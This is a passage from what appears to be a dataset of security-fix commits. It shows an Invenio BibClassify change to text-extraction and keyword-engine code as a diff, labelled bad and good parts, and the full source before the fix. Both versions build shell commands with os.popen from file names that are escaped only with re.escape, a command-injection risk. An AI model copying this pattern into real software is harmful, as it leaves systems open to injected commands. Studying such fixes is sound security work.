component_comparison:\n            return component_comparison\n\n    return cmp(len(str(kw1[0])), len(str(kw0[0])))\n\n\ndef _kw(keywords):\n    \"\"\"Turn list of keywords into dictionary.\"\"\"\n    r = {}\n    for k, v in keywords:\n        r[k] = v\n    return r\n\n\ndef _sort_kw_matches(skw_matches, limit=0):\n    \"\"\"Return a resized version of keywords to the given length.\"\"\"\n    sorted_keywords = list(skw_matches.items())\n    sorted_keywords.sort(_skw_matches_comparator)\n    return limit and sorted_keywords[:limit] or sorted_keywords\n\n\ndef _get_partial_text(fulltext):\n    \"\"\"\n    Return a short version of the fulltext used with the partial matching mode.\n\n    The version is composed of 20% in the beginning and 20% in the middle of the\n    text.\"\"\"\n    length = len(fulltext)\n\n    get_index = lambda x: int(float(x) / 100 * length)\n\n    partial_text = [fulltext[get_index(start):get_index(end)]\n                    for start, end in bconfig.CFG_BIBCLASSIFY_PARTIAL_TEXT]\n\n    return \"\\n\".join(partial_text)\n\n\ndef save_keywords(filename, xml):\n    tmp_dir = os.path.dirname(filename)\n    if not os.path.isdir(tmp_dir):\n        os.mkdir(tmp_dir)\n\n    file_desc = open(filename, \"w\")\n    file_desc.write(xml)\n    file_desc.close()\n\n\ndef get_tmp_file(recid):\n    tmp_directory = \"%s/bibclassify\" % bconfig.CFG_TMPDIR\n    if not os.path.isdir(tmp_directory):\n        os.mkdir(tmp_directory)\n    filename = \"bibclassify_%s.xml\" % recid\n    abs_path = os.path.join(tmp_directory, filename)\n    return abs_path\n\n\ndef _parse_marc_code(field):\n    \"\"\"Parse marc field and return default indicators if not filled in.\"\"\"\n    field = str(field)\n    if len(field) < 4:\n        raise Exception('Wrong field code: %s' % field)\n    else:\n        field += '__'\n    tag = field[0:3]\n    ind1 = field[3].replace('_', '')\n    ind2 = field[4].replace('_', '')\n    return tag, ind1, ind2\n\n\nif __name__ == \"__main__\":\n    log.error(\"Please use bibclassify_cli from now on.\")\n"}, "/invenio/legacy/bibclassify/ontology_reader.py": {"changes": [{"diff": "\n                 for label in self.compositeof:\n                     _get_ckw_components(new_vals, label)\n                 self.compositeof = new_vals\n-            except TaxonomyError:\n+            except TaxonomyError as err:\n                 # the composites will be empty\n                 # (better than to have confusing, partial matches)\n                 self.compositeof = []\n-                log.error(\n-                    'We reset this composite keyword, so that it does not match anything. Please fix the taxonomy.')\n+                log.error(err)\n \n     def isComposite(self):\n         \"\"\"Return value of _composite.\"\"", "add": 2, "remove": 3, "filename": "/invenio/legacy/bibclassify/ontology_reader.py", "badparts": ["            except TaxonomyError:", "                log.error(", "                    'We reset this composite keyword, so that it does not match anything. Please fix the taxonomy.')"], "goodparts": ["            except TaxonomyError as err:", "                log.error(err)"]}]}, "/invenio/legacy/bibclassify/text_extractor.py": {"changes": [{"diff": "\n # 59 Temple Place, Suite 330, Boston, MA 02111-1307, USA.\n \n-\"\"\"\n-BibClassify text extractor.\n+\"\"\"BibClassify text extractor.\n \n This module provides method to extract the fulltext from local or remote\n documents. Currently 2 formats of documents are supported: PDF and text\n", "add": 1, "remove": 2, "filename": "/invenio/legacy/bibclassify/text_extractor.py", "badparts": ["\"\"\"", "BibClassify text extractor."], "goodparts": ["\"\"\"BibClassify text extractor."]}, {"diff": "\n import os\n import re\n-import tempfile\n-import urllib2\n+\n from invenio.legacy.bibclassify import config as bconfig\n \n if bconfig.STANDALONE:\n", "add": 1, "remove": 2, "filename": "/invenio/legacy/bibclassify/text_extractor.py", "badparts": ["import tempfile", "import urllib2"], "goodparts": []}, {"diff": "\n \n def is_pdf(document):\n-    \"\"\"Checks if a document is a PDF file. Returns True if is is.\"\"\"\n+    \"\"\"Check if a document is a PDF file and returns True if is is.\"\"\"\n     if not executable_exists('pdftotext'):\n         log.warning(\"GNU file was not found on the system. \"\n                     \"Switching to a weak file extension test.\")\n", "add": 1, "remove": 1, "filename": "/invenio/legacy/bibclassify/text_extractor.py", "badparts": ["    \"\"\"Checks if a document is a PDF file. Returns True if is is.\"\"\""], "goodparts": ["    \"\"\"Check if a document is a PDF file and returns True if is is.\"\"\""]}, {"diff": "\n     # version 4.10.\n     file_output = os.popen('file ' + re.escape(document)).read()\n     try:\n-        filetype = file_output.split(\":\")[1]\n+        filetype = file_output.split(\":\")[-1]\n     except IndexError:\n         log.error(\"Your version of the 'file' utility seems to \"\n-                  \"be unsupported. Please report this to cds.support@cern.ch.\")\n+                  \"be unsupported.\")\n         raise Exception('Incompatible pdftotext')\n \n     pdf = filetype.find(\"PDF\") > -1\n     # This is how it should be done however this is incompatible with\n     # file version 4.10.\n-    #os.popen('file -bi ' + document).read().find(\"application/pdf\")\n+    # os.popen('file -bi ' + document).read().find(\"application/pdf\")\n     return pdf\n \n \n def text_lines_from_local_file(document, remote=False):\n-    \"\"\"Returns the fulltext of the local file.\n+    \"\"\"Return the fulltext of the local file.\n+\n     @var document: fullpath to the file that should be read\n     @var remote: boolean, if True does not count lines (gosh!)\n     @return: list of lines if st was read or an empty list\"\"\"\n-\n     try:\n         if is_pdf(document):\n             if not executable_exists(\"pdftotext\"):\n", "add": 5, "remove": 5, "filename": "/invenio/legacy/bibclassify/text_extractor.py", "badparts": ["        filetype = file_output.split(\":\")[1]", "                  \"be unsupported. Please report this to cds.support@cern.ch.\")", "    \"\"\"Returns the fulltext of the local file."], "goodparts": ["        filetype = file_output.split(\":\")[-1]", "                  \"be unsupported.\")", "    \"\"\"Return the fulltext of the local file."]}, {"diff": "\n     lines = [line.decode(\"utf-8\", 'replace') for line in filestream]\n     filestream.close()\n \n-    if not _is_english_text('\\n'.join(lines)):\n-        log.warning(\"It seems the file '%s' is unvalid and doesn't \"\n-                    \"contain text. Please communicate this file to the Invenio \"\n-                    \"team.\" % document)\n-\n-    line_nb = len(lines)\n-    word_nb = 0\n-    for line in lines:\n-        word_nb += len(re.findall(\"\\S+\", line))\n-\n     # Discard lines that do not contain at least one word.\n-    lines = [line for line in lines if _ONE_WORD.search(line) is not None]\n-\n-    if not remote:\n-        log.info(\"Local file has %d lines and %d words.\" % (line_nb, word_nb))\n-\n-    return lines\n-\n-\n-def _is_english_text(text):\n-    \"\"\"\n-    Checks if a text is correct english.\n-    Computes the number of words in the text and compares it to the\n-    expected number of words (based on an average size of words of 5.1\n-    letters).\n-\n-    @param text_lines: the text to analyze\n-    @type text_lines:  string\n-    @return:           True if the text is English, False otherwise\n-    @rtype:            Boolean\n-    \"\"\"\n-    # Consider one word and one space.\n-    avg_word_length = 2.55 + 1\n-    expected_word_number = float(len(text)) / avg_word_length\n-\n-    words = [word\n-             for word in re.split('\\W', text)\n-             if word.isalpha()]\n-\n-    word_number = len(words)\n-\n-    return word_number > expected_word_number\n-\n-\n-def text_lines_from_url(url, user_agent=\"\"):\n-    \"\"\"Returns the fulltext of the file found at the URL.\"\"\"\n-    request = urllib2.Request(url)\n-    if user_agent:\n-        request.add_header(\"User-Agent\", user_agent)\n-    try:\n-        distant_stream = urlopen(request)\n-        # Write the URL content to a temporary file.\n-        local_file = tempfile.mkstemp(prefix=\"bibclassify.\")[1]\n-        local_stream = open(local_file, \"w\")\n-        local_stream.write(distant_stream.read())\n-        local_stream.close()\n-    except:\n-        log.error(\"Unable to read from URL %s.\" % url)\n-        return None\n-    else:\n-        # Read lines from the temporary file.\n-        lines = text_lines_from_local_file(local_file, remote=True)\n-        os.remove(local_file)\n-\n-        line_nb = len(lines)\n-        word_nb = 0\n-        for line in lines:\n-            word_nb += len(re.findall(\"\\S+\", line))\n-\n-        log.info(\"Remote file has %d lines and %d words.\" % (line_nb, word_nb))\n-\n-        return lines\n+    return [line for line in lines if _ONE_WORD.search(line) is not None]\n \n \n def executable_exists(executable):\n-    \"\"\"Tests if an executable is available on the system.\"\"\"\n+    \"\"\"Test if an executable is available on the system.\"\"\"\n     for directory in os.getenv(\"PATH\").split(\":\"):\n         if os.path.exists(os.path.join(directory, executable)):\n             return True\n     return False\n-\n-\n", "add": 2, "remove": 74, "filename": "/invenio/legacy/bibclassify/text_extractor.py", "badparts": ["    if not _is_english_text('\\n'.join(lines)):", "        log.warning(\"It seems the file '%s' is unvalid and doesn't \"", "                    \"contain text. Please communicate this file to the Invenio \"", "                    \"team.\" % document)", "    line_nb = len(lines)", "    word_nb = 0", "    for line in lines:", "        word_nb += len(re.findall(\"\\S+\", line))", "    lines = [line for line in lines if _ONE_WORD.search(line) is not None]", "    if not remote:", "        log.info(\"Local file has %d lines and %d words.\" % (line_nb, word_nb))", "    return lines", "def _is_english_text(text):", "    \"\"\"", "    Checks if a text is correct english.", "    Computes the number of words in the text and compares it to the", "    expected number of words (based on an average size of words of 5.1", "    letters).", "    @param text_lines: the text to analyze", "    @type text_lines:  string", "    @return:           True if the text is English, False otherwise", "    @rtype:            Boolean", "    \"\"\"", "    avg_word_length = 2.55 + 1", "    expected_word_number = float(len(text)) / avg_word_length", "    words = [word", "             for word in re.split('\\W', text)", "             if word.isalpha()]", "    word_number = len(words)", "    return word_number > expected_word_number", "def text_lines_from_url(url, user_agent=\"\"):", "    \"\"\"Returns the fulltext of the file found at the URL.\"\"\"", "    request = urllib2.Request(url)", "    if user_agent:", "        request.add_header(\"User-Agent\", user_agent)", "    try:", "        distant_stream = urlopen(request)", "        local_file = tempfile.mkstemp(prefix=\"bibclassify.\")[1]", "        local_stream = open(local_file, \"w\")", "        local_stream.write(distant_stream.read())", "        local_stream.close()", "    except:", "        log.error(\"Unable to read from URL %s.\" % url)", "        return None", "    else:", "        lines = text_lines_from_local_file(local_file, remote=True)", "        os.remove(local_file)", "        line_nb = len(lines)", "        word_nb = 0", "        for line in lines:", "            word_nb += len(re.findall(\"\\S+\", line))", "        log.info(\"Remote file has %d lines and %d words.\" % (line_nb, word_nb))", "        return lines", "    \"\"\"Tests if an executable is available on the system.\"\"\""], "goodparts": ["    return [line for line in lines if _ONE_WORD.search(line) is not None]", "    \"\"\"Test if an executable is available on the system.\"\"\""]}], "source": "\n \"\"\" BibClassify text extractor. This module provides method to extract the fulltext from local or remote documents. Currently 2 formats of documents are supported: PDF and text documents. 2 methods provide the functionality of the module: text_lines_from_local_file and text_lines_from_url. This module also provides the utility 'is_pdf' that uses GNU file in order to determine if a local file is a PDF file. This module is STANDALONE safe \"\"\" import os import re import tempfile import urllib2 from invenio.legacy.bibclassify import config as bconfig if bconfig.STANDALONE: from urllib2 import urlopen else: from invenio.utils.url import make_invenio_opener urlopen=make_invenio_opener('BibClassify').open log=bconfig.get_logger(\"bibclassify.text_extractor\") _ONE_WORD=re.compile(\"[A-Za-z]{2,}\") def is_pdf(document): \"\"\"Checks if a document is a PDF file. Returns True if is is.\"\"\" if not executable_exists('pdftotext'): log.warning(\"GNU file was not found on the system. \" \"Switching to a weak file extension test.\") if document.lower().endswith(\".pdf\"): return True return False file_output=os.popen('file ' +re.escape(document)).read() try: filetype=file_output.split(\":\")[1] except IndexError: log.error(\"Your version of the 'file' utility seems to \" \"be unsupported. Please report this to cds.support@cern.ch.\") raise Exception('Incompatible pdftotext') pdf=filetype.find(\"PDF\") > -1 return pdf def text_lines_from_local_file(document, remote=False): \"\"\"Returns the fulltext of the local file. @var document: fullpath to the file that should be read @var remote: boolean, if True does not count lines(gosh!) @return: list of lines if st was read or an empty list\"\"\" try: if is_pdf(document): if not executable_exists(\"pdftotext\"): log.error(\"pdftotext is not available on the system.\") cmd=\"pdftotext -q -enc UTF-8 %s -\" % re.escape(document) filestream=os.popen(cmd) else: filestream=open(document, \"r\") except IOError as ex1: log.error(\"Unable to read from file %s.(%s)\" %(document, ex1.strerror)) return[] lines=[line.decode(\"utf-8\", 'replace') for line in filestream] filestream.close() if not _is_english_text('\\n'.join(lines)): log.warning(\"It seems the file '%s' is unvalid and doesn't \" \"contain text. Please communicate this file to the Invenio \" \"team.\" % document) line_nb=len(lines) word_nb=0 for line in lines: word_nb +=len(re.findall(\"\\S+\", line)) lines=[line for line in lines if _ONE_WORD.search(line) is not None] if not remote: log.info(\"Local file has %d lines and %d words.\" %(line_nb, word_nb)) return lines def _is_english_text(text): \"\"\" Checks if a text is correct english. Computes the number of words in the text and compares it to the expected number of words(based on an average size of words of 5.1 letters). @param text_lines: the text to analyze @type text_lines: string @return: True if the text is English, False otherwise @rtype: Boolean \"\"\" avg_word_length=2.55 +1 expected_word_number=float(len(text)) / avg_word_length words=[word for word in re.split('\\W', text) if word.isalpha()] word_number=len(words) return word_number > expected_word_number def text_lines_from_url(url, user_agent=\"\"): \"\"\"Returns the fulltext of the file found at the URL.\"\"\" request=urllib2.Request(url) if user_agent: request.add_header(\"User-Agent\", user_agent) try: distant_stream=urlopen(request) local_file=tempfile.mkstemp(prefix=\"bibclassify.\")[1] local_stream=open(local_file, \"w\") local_stream.write(distant_stream.read()) local_stream.close() except: log.error(\"Unable to read from URL %s.\" % url) return None else: lines=text_lines_from_local_file(local_file, remote=True) os.remove(local_file) line_nb=len(lines) word_nb=0 for line in lines: word_nb +=len(re.findall(\"\\S+\", line)) log.info(\"Remote file has %d lines and %d words.\" %(line_nb, word_nb)) return lines def executable_exists(executable): \"\"\"Tests if an executable is available on the system.\"\"\" for directory in os.getenv(\"PATH\").split(\":\"): if os.path.exists(os.path.join(directory, executable)): return True return False ", "sourceWithComments": "# -*- coding: utf-8 -*-\n#\n# This file is part of Invenio.\n# Copyright (C) 2008, 2009, 2010, 2011, 2013, 2014 CERN.\n#\n# Invenio is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License as\n# published by the Free Software Foundation; either version 2 of the\n# License, or (at your option) any later version.\n#\n# Invenio is distributed in the hope that it will be useful, but\n# WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Invenio; if not, write to the Free Software Foundation, Inc.,\n# 59 Temple Place, Suite 330, Boston, MA 02111-1307, USA.\n\n\"\"\"\nBibClassify text extractor.\n\nThis module provides method to extract the fulltext from local or remote\ndocuments. Currently 2 formats of documents are supported: PDF and text\ndocuments.\n\n2 methods provide the functionality of the module: text_lines_from_local_file\nand text_lines_from_url.\n\nThis module also provides the utility 'is_pdf' that uses GNU file in order to\ndetermine if a local file is a PDF file.\n\nThis module is STANDALONE safe\n\"\"\"\n\nimport os\nimport re\nimport tempfile\nimport urllib2\nfrom invenio.legacy.bibclassify import config as bconfig\n\nif bconfig.STANDALONE:\n    from urllib2 import urlopen\nelse:\n    from invenio.utils.url import make_invenio_opener\n\n    urlopen = make_invenio_opener('BibClassify').open\n\nlog = bconfig.get_logger(\"bibclassify.text_extractor\")\n\n_ONE_WORD = re.compile(\"[A-Za-z]{2,}\")\n\n\ndef is_pdf(document):\n    \"\"\"Checks if a document is a PDF file. Returns True if is is.\"\"\"\n    if not executable_exists('pdftotext'):\n        log.warning(\"GNU file was not found on the system. \"\n                    \"Switching to a weak file extension test.\")\n        if document.lower().endswith(\".pdf\"):\n            return True\n        return False\n        # Tested with file version >= 4.10. First test is secure and works\n    # with file version 4.25. Second condition is tested for file\n    # version 4.10.\n    file_output = os.popen('file ' + re.escape(document)).read()\n    try:\n        filetype = file_output.split(\":\")[1]\n    except IndexError:\n        log.error(\"Your version of the 'file' utility seems to \"\n                  \"be unsupported. Please report this to cds.support@cern.ch.\")\n        raise Exception('Incompatible pdftotext')\n\n    pdf = filetype.find(\"PDF\") > -1\n    # This is how it should be done however this is incompatible with\n    # file version 4.10.\n    #os.popen('file -bi ' + document).read().find(\"application/pdf\")\n    return pdf\n\n\ndef text_lines_from_local_file(document, remote=False):\n    \"\"\"Returns the fulltext of the local file.\n    @var document: fullpath to the file that should be read\n    @var remote: boolean, if True does not count lines (gosh!)\n    @return: list of lines if st was read or an empty list\"\"\"\n\n    try:\n        if is_pdf(document):\n            if not executable_exists(\"pdftotext\"):\n                log.error(\"pdftotext is not available on the system.\")\n            cmd = \"pdftotext -q -enc UTF-8 %s -\" % re.escape(document)\n            filestream = os.popen(cmd)\n        else:\n            filestream = open(document, \"r\")\n    except IOError as ex1:\n        log.error(\"Unable to read from file %s. (%s)\" % (document, ex1.strerror))\n        return []\n\n    # FIXME - we assume it is utf-8 encoded / that is not good\n    lines = [line.decode(\"utf-8\", 'replace') for line in filestream]\n    filestream.close()\n\n    if not _is_english_text('\\n'.join(lines)):\n        log.warning(\"It seems the file '%s' is unvalid and doesn't \"\n                    \"contain text. Please communicate this file to the Invenio \"\n                    \"team.\" % document)\n\n    line_nb = len(lines)\n    word_nb = 0\n    for line in lines:\n        word_nb += len(re.findall(\"\\S+\", line))\n\n    # Discard lines that do not contain at least one word.\n    lines = [line for line in lines if _ONE_WORD.search(line) is not None]\n\n    if not remote:\n        log.info(\"Local file has %d lines and %d words.\" % (line_nb, word_nb))\n\n    return lines\n\n\ndef _is_english_text(text):\n    \"\"\"\n    Checks if a text is correct english.\n    Computes the number of words in the text and compares it to the\n    expected number of words (based on an average size of words of 5.1\n    letters).\n\n    @param text_lines: the text to analyze\n    @type text_lines:  string\n    @return:           True if the text is English, False otherwise\n    @rtype:            Boolean\n    \"\"\"\n    # Consider one word and one space.\n    avg_word_length = 2.55 + 1\n    expected_word_number = float(len(text)) / avg_word_length\n\n    words = [word\n             for word in re.split('\\W', text)\n             if word.isalpha()]\n\n    word_number = len(words)\n\n    return word_number > expected_word_number\n\n\ndef text_lines_from_url(url, user_agent=\"\"):\n    \"\"\"Returns the fulltext of the file found at the URL.\"\"\"\n    request = urllib2.Request(url)\n    if user_agent:\n        request.add_header(\"User-Agent\", user_agent)\n    try:\n        distant_stream = urlopen(request)\n        # Write the URL content to a temporary file.\n        local_file = tempfile.mkstemp(prefix=\"bibclassify.\")[1]\n        local_stream = open(local_file, \"w\")\n        local_stream.write(distant_stream.read())\n        local_stream.close()\n    except:\n        log.error(\"Unable to read from URL %s.\" % url)\n        return None\n    else:\n        # Read lines from the temporary file.\n        lines = text_lines_from_local_file(local_file, remote=True)\n        os.remove(local_file)\n\n        line_nb = len(lines)\n        word_nb = 0\n        for line in lines:\n            word_nb += len(re.findall(\"\\S+\", line))\n\n        log.info(\"Remote file has %d lines and %d words.\" % (line_nb, word_nb))\n\n        return lines\n\n\ndef executable_exists(executable):\n    \"\"\"Tests if an executable is available on the system.\"\"\"\n    for directory in os.getenv(\"PATH\").split(\":\"):\n        if os.path.exists(os.path.join(directory, executable)):\n            return True\n    return False\n\n\n"}}, "msg": "classifier: support colons in file paths\n\n* FIX Properly handles file paths containing a colon (:), avoiding\n  bad text extraction that causes (1) wrong results and (2) much slower\n  execution.\n\n* Improves the reporting of problems in the ontology.\n\n* Removes check if PDF text is English as it is irrelevant.\n\n* Refactors a bit the code to download remote files.\n\nSigned-off-by: Jan Aage Lavik <jan.age.lavik@cern.ch>"}}, "https://github.com/inveniosoftware/invenio": {"4b56c071c54a0e1f1a86dca49fe455207d4148c7": {"url": "https://api.github.com/repos/inveniosoftware/invenio/commits/4b56c071c54a0e1f1a86dca49fe455207d4148c7", "html_url": "https://github.com/inveniosoftware/invenio/commit/4b56c071c54a0e1f1a86dca49fe455207d4148c7", "sha": "4b56c071c54a0e1f1a86dca49fe455207d4148c7", "keyword": "remote code execution improve", "diff": "diff --git a/invenio/legacy/bibclassify/engine.py b/invenio/legacy/bibclassify/engine.py\nindex 561dbdfbc6..ec35dd6b9f 100644\n--- a/invenio/legacy/bibclassify/engine.py\n+++ b/invenio/legacy/bibclassify/engine.py\n@@ -35,6 +35,7 @@\n from __future__ import print_function\n \n import os\n+import re\n from six import iteritems\n import config as bconfig\n \n@@ -44,8 +45,8 @@\n import keyword_analyzer as keyworder\n import acronym_analyzer as acronymer\n \n-from invenio.utils.url import make_user_agent_string\n from invenio.utils.text import encode_for_xml\n+from invenio.utils.filedownload import download_url\n \n log = bconfig.get_logger(\"bibclassify.engine\")\n \n@@ -60,7 +61,6 @@ def output_keywords_for_sources(input_sources, taxonomy_name, output_mode=\"text\"\n                                 rebuild_cache=False, only_core_tags=False, extract_acronyms=False,\n                                 api=False, **kwargs):\n     \"\"\"Output the keywords for each source in sources.\"\"\"\n-\n     # Inner function which does the job and it would be too much work to\n     # refactor the call (and it must be outside the loop, before it did\n     # not process multiple files)\n@@ -68,6 +68,12 @@ def process_lines():\n         if output_mode == \"text\":\n             print(\"Input file: %s\" % source)\n \n+        line_nb = len(text_lines)\n+        word_nb = 0\n+        for line in text_lines:\n+            word_nb += len(re.findall(\"\\S+\", line))\n+\n+        log.info(\"Remote file has %d lines and %d words.\" % (line_nb, word_nb))\n         output = get_keywords_from_text(\n             text_lines,\n             taxonomy_name,\n@@ -110,8 +116,8 @@ def process_lines():\n                 process_lines()\n         else:\n             # Treat as a URL.\n-            text_lines = extractor.text_lines_from_url(entry,\n-                                                       user_agent=make_user_agent_string(\"BibClassify\"))\n+            local_file = download_url(entry)\n+            text_lines = extractor.text_lines_from_local_file(local_file)\n             if text_lines:\n                 source = entry.split(\"/\")[-1]\n                 process_lines()\n@@ -122,9 +128,10 @@ def get_keywords_from_local_file(local_file, taxonomy_name, output_mode=\"text\",\n                                  match_mode=\"full\", no_cache=False, with_author_keywords=False,\n                                  rebuild_cache=False, only_core_tags=False, extract_acronyms=False, api=False,\n                                  **kwargs):\n-    \"\"\"Outputs keywords reading a local file. Arguments and output are the same\n-    as for :see: get_keywords_from_text() \"\"\"\n+    \"\"\"Output keywords reading a local file.\n \n+    Arguments and output are the same as for :see: get_keywords_from_text().\n+    \"\"\"\n     log.info(\"Analyzing keywords for local file %s.\" % local_file)\n     text_lines = extractor.text_lines_from_local_file(local_file)\n \n@@ -147,7 +154,7 @@ def get_keywords_from_text(text_lines, taxonomy_name, output_mode=\"text\",\n                            with_author_keywords=False, rebuild_cache=False,\n                            only_core_tags=False, extract_acronyms=False,\n                            **kwargs):\n-    \"\"\"Extract keywords from the list of strings\n+    \"\"\"Extract keywords from the list of strings.\n \n     :param text_lines: list of strings (will be normalized before being\n         joined into one string)\n@@ -165,7 +172,6 @@ def get_keywords_from_text(text_lines, taxonomy_name, output_mode=\"text\",\n         (single_keywords, composite_keywords, author_keywords, acronyms)\n         for other output modes it returns formatted string\n     \"\"\"\n-\n     cache = reader.get_cache(taxonomy_name)\n     if not cache:\n         reader.set_cache(taxonomy_name,\n@@ -202,7 +208,8 @@ def get_keywords_from_text(text_lines, taxonomy_name, output_mode=\"text\",\n \n \n def extract_single_keywords(skw_db, fulltext):\n-    \"\"\"Find single keywords in the fulltext\n+    \"\"\"Find single keywords in the fulltext.\n+\n     :var skw_db: list of KeywordToken objects\n     :var fulltext: string, which will be searched\n     :return : dictionary of matches in a format {\ndiff --git a/invenio/legacy/bibclassify/ontology_reader.py b/invenio/legacy/bibclassify/ontology_reader.py\nindex 25624f0e94..008ee553fe 100644\n--- a/invenio/legacy/bibclassify/ontology_reader.py\n+++ b/invenio/legacy/bibclassify/ontology_reader.py\n@@ -485,12 +485,11 @@ def _get_ckw_components(new_vals, label):\n                 for label in self.compositeof:\n                     _get_ckw_components(new_vals, label)\n                 self.compositeof = new_vals\n-            except TaxonomyError:\n+            except TaxonomyError as err:\n                 # the composites will be empty\n                 # (better than to have confusing, partial matches)\n                 self.compositeof = []\n-                log.error(\n-                    'We reset this composite keyword, so that it does not match anything. Please fix the taxonomy.')\n+                log.error(err)\n \n     def isComposite(self):\n         \"\"\"Return value of _composite.\"\"\"\ndiff --git a/invenio/legacy/bibclassify/text_extractor.py b/invenio/legacy/bibclassify/text_extractor.py\nindex 4fcb10352b..56fa43c6be 100644\n--- a/invenio/legacy/bibclassify/text_extractor.py\n+++ b/invenio/legacy/bibclassify/text_extractor.py\n@@ -1,7 +1,7 @@\n # -*- coding: utf-8 -*-\n #\n # This file is part of Invenio.\n-# Copyright (C) 2008, 2009, 2010, 2011, 2013, 2014 CERN.\n+# Copyright (C) 2008, 2009, 2010, 2011, 2013, 2014, 2015 CERN.\n #\n # Invenio is free software; you can redistribute it and/or\n # modify it under the terms of the GNU General Public License as\n@@ -17,8 +17,7 @@\n # along with Invenio; if not, write to the Free Software Foundation, Inc.,\n # 59 Temple Place, Suite 330, Boston, MA 02111-1307, USA.\n \n-\"\"\"\n-BibClassify text extractor.\n+\"\"\"BibClassify text extractor.\n \n This module provides method to extract the fulltext from local or remote\n documents. Currently 2 formats of documents are supported: PDF and text\n@@ -35,8 +34,7 @@\n \n import os\n import re\n-import tempfile\n-import urllib2\n+\n from invenio.legacy.bibclassify import config as bconfig\n \n if bconfig.STANDALONE:\n@@ -52,7 +50,7 @@\n \n \n def is_pdf(document):\n-    \"\"\"Checks if a document is a PDF file. Returns True if is is.\"\"\"\n+    \"\"\"Check if a document is a PDF file and returns True if is is.\"\"\"\n     if not executable_exists('pdftotext'):\n         log.warning(\"GNU file was not found on the system. \"\n                     \"Switching to a weak file extension test.\")\n@@ -64,25 +62,25 @@ def is_pdf(document):\n     # version 4.10.\n     file_output = os.popen('file ' + re.escape(document)).read()\n     try:\n-        filetype = file_output.split(\":\")[1]\n+        filetype = file_output.split(\":\")[-1]\n     except IndexError:\n         log.error(\"Your version of the 'file' utility seems to \"\n-                  \"be unsupported. Please report this to cds.support@cern.ch.\")\n+                  \"be unsupported.\")\n         raise Exception('Incompatible pdftotext')\n \n     pdf = filetype.find(\"PDF\") > -1\n     # This is how it should be done however this is incompatible with\n     # file version 4.10.\n-    #os.popen('file -bi ' + document).read().find(\"application/pdf\")\n+    # os.popen('file -bi ' + document).read().find(\"application/pdf\")\n     return pdf\n \n \n def text_lines_from_local_file(document, remote=False):\n-    \"\"\"Returns the fulltext of the local file.\n+    \"\"\"Return the fulltext of the local file.\n+\n     @var document: fullpath to the file that should be read\n     @var remote: boolean, if True does not count lines (gosh!)\n     @return: list of lines if st was read or an empty list\"\"\"\n-\n     try:\n         if is_pdf(document):\n             if not executable_exists(\"pdftotext\"):\n@@ -99,85 +97,13 @@ def text_lines_from_local_file(document, remote=False):\n     lines = [line.decode(\"utf-8\", 'replace') for line in filestream]\n     filestream.close()\n \n-    if not _is_english_text('\\n'.join(lines)):\n-        log.warning(\"It seems the file '%s' is unvalid and doesn't \"\n-                    \"contain text. Please communicate this file to the Invenio \"\n-                    \"team.\" % document)\n-\n-    line_nb = len(lines)\n-    word_nb = 0\n-    for line in lines:\n-        word_nb += len(re.findall(\"\\S+\", line))\n-\n     # Discard lines that do not contain at least one word.\n-    lines = [line for line in lines if _ONE_WORD.search(line) is not None]\n-\n-    if not remote:\n-        log.info(\"Local file has %d lines and %d words.\" % (line_nb, word_nb))\n-\n-    return lines\n-\n-\n-def _is_english_text(text):\n-    \"\"\"\n-    Checks if a text is correct english.\n-    Computes the number of words in the text and compares it to the\n-    expected number of words (based on an average size of words of 5.1\n-    letters).\n-\n-    @param text_lines: the text to analyze\n-    @type text_lines:  string\n-    @return:           True if the text is English, False otherwise\n-    @rtype:            Boolean\n-    \"\"\"\n-    # Consider one word and one space.\n-    avg_word_length = 2.55 + 1\n-    expected_word_number = float(len(text)) / avg_word_length\n-\n-    words = [word\n-             for word in re.split('\\W', text)\n-             if word.isalpha()]\n-\n-    word_number = len(words)\n-\n-    return word_number > expected_word_number\n-\n-\n-def text_lines_from_url(url, user_agent=\"\"):\n-    \"\"\"Returns the fulltext of the file found at the URL.\"\"\"\n-    request = urllib2.Request(url)\n-    if user_agent:\n-        request.add_header(\"User-Agent\", user_agent)\n-    try:\n-        distant_stream = urlopen(request)\n-        # Write the URL content to a temporary file.\n-        local_file = tempfile.mkstemp(prefix=\"bibclassify.\")[1]\n-        local_stream = open(local_file, \"w\")\n-        local_stream.write(distant_stream.read())\n-        local_stream.close()\n-    except:\n-        log.error(\"Unable to read from URL %s.\" % url)\n-        return None\n-    else:\n-        # Read lines from the temporary file.\n-        lines = text_lines_from_local_file(local_file, remote=True)\n-        os.remove(local_file)\n-\n-        line_nb = len(lines)\n-        word_nb = 0\n-        for line in lines:\n-            word_nb += len(re.findall(\"\\S+\", line))\n-\n-        log.info(\"Remote file has %d lines and %d words.\" % (line_nb, word_nb))\n-\n-        return lines\n+    return [line for line in lines if _ONE_WORD.search(line) is not None]\n \n \n def executable_exists(executable):\n-    \"\"\"Tests if an executable is available on the system.\"\"\"\n+    \"\"\"Test if an executable is available on the system.\"\"\"\n     for directory in os.getenv(\"PATH\").split(\":\"):\n         if os.path.exists(os.path.join(directory, executable)):\n             return True\n     return False\n-\n-\n", "message": "", "files": {"/invenio/legacy/bibclassify/engine.py": {"changes": [{"diff": "\n import acronym_analyzer as acronymer\n \n-from invenio.utils.url import make_user_agent_string\n from invenio.utils.text import encode_for_xml\n+from invenio.utils.filedownload import download_url\n \n log = bconfig.get_logger(\"bibclassify.engine\")\n \n", "add": 1, "remove": 1, "filename": "/invenio/legacy/bibclassify/engine.py", "badparts": ["from invenio.utils.url import make_user_agent_string"], "goodparts": ["from invenio.utils.filedownload import download_url"]}, {"diff": "\n                 process_lines()\n         else:\n             # Treat as a URL.\n-            text_lines = extractor.text_lines_from_url(entry,\n-                                                       user_agent=make_user_agent_string(\"BibClassify\"))\n+            local_file = download_url(entry)\n+            text_lines = extractor.text_lines_from_local_file(local_file)\n             if text_lines:\n                 source = entry.split(\"/\")[-1]\n                 process_lines()\n", "add": 2, "remove": 2, "filename": "/invenio/legacy/bibclassify/engine.py", "badparts": ["            text_lines = extractor.text_lines_from_url(entry,", "                                                       user_agent=make_user_agent_string(\"BibClassify\"))"], "goodparts": ["            local_file = download_url(entry)", "            text_lines = extractor.text_lines_from_local_file(local_file)"]}, {"diff": "\n                                  match_mode=\"full\", no_cache=False, with_author_keywords=False,\n                                  rebuild_cache=False, only_core_tags=False, extract_acronyms=False, api=False,\n                                  **kwargs):\n-    \"\"\"Outputs keywords reading a local file. Arguments and output are the same\n-   